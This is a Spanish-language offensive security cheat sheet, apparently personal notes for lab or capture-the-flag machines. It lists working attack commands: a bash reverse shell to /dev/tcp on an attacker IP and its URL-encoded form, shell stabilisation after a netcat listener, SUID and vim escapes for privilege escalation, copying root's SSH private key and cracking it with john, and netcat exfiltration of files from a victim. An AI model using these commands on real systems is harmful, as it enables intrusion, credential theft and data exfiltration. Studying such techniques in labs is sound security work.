**Para analizar páginas web que estén creadas con wordpress podemos realizar estos dos comandos:**
\```
 “wpscan –url http://ip”
\```

Y en caso de que no veamos nada vulnerable, podemos probar a buscar posibles plugins vulnerables:
wpscan --plugins-version-detection aggressive --url http://192.168.0.5/wordpress

Opciones para crear una shell inversa:
https://www.revshells.com/
 “/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.0.4/1234 0>&1'”
 En caso de querer codificarla en url, podemos realizar el siguiente comando:
urlencode "/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.0.4/1234 0>&1'"
Sacar hashes de ficheros zip:
zip2john muyconfidencial.zip > hash_muyconfidencial
Para tener una mejor consola interactiva una vez hemos realizado nc -lvp 1234
SHELL=/bin/bash script -q /dev/null
Hacemos control +z
stty raw -echo && fg
escribimos reset
xterm
export TERM=xterm
(un máquina atacante usamos stty size para saber el tamaño de la terminal)
En la vicitma ejecutamos stty rows x columns y
Página donde ver como escalar privilegios con los binarios (sudo -l )
https://gtfobins.github.io/gtfobins/aws/#sudo
Visualizar todos los ficheros ordenados por directorios para ver los permisos ls -la /* | less
Página donde se ven diferentes tipos de ataque: https://deephacking.tech/
Ejemplo de uso para escalar priv con rutas absolutas:sudo -u root /usr/bin/python3.11 /home/arasaka/randombase64.py
pspy - Script que permite visualizar todos los procesos que se están ejecutando en el sistema sin ser root.
Escalar priv por medio de SUID - Dar privilegios p.j /bin/bash u+s o (4777) ejecutar el comando del ejemplo bash -p (la opción -p en bash (preserve privileges) le dice a Bash que mantenga los permisos de usuario efectivo). Ejemplo de Búsqueda de Archivos SUID find / -perm -4000 -type f 2>/dev/null (para buscar ficheros) find / -perm -4000 2>/dev/null (para buscar directorios). Otro ejemplo pero con un editor como puede ser vim: vim -c una vez dentro ejecutar: ':!/bin/sh'
Se puede buscar info en https://gtfobins.github.io/
En algún supuesto caso de que tengamos posibilidad de ver ficheros como root sin serlo y necesitemos escalar a root, una de las posibilidades es entrar en  /root/.ssh/id_rsa y copiar la clave a nuestra máquina atacante para posteriormente hashear esa clave e intentar sacar la contraseña por el hash. -> ssh2john ficherodondeguardamoslakey > salidaficherohasheado            john ficherohasheado –wordlist /usr/share/wordlist/rockyou   Para terminar, una vez obtengamos la contraseña nos podemos conectar desde la atacante usando el fichero con la clave privada sudo ssh root@ip -i ficheroconlakey
Enviar ficheros por netcat (Victima) nc -q 0 192.168.16.37 9999 < BurgerWithoutCheese.zip (atacante) nc -nvlp 9999 > BurgerWithoutCheese.zip
Hydra Brute Force Login Attacks
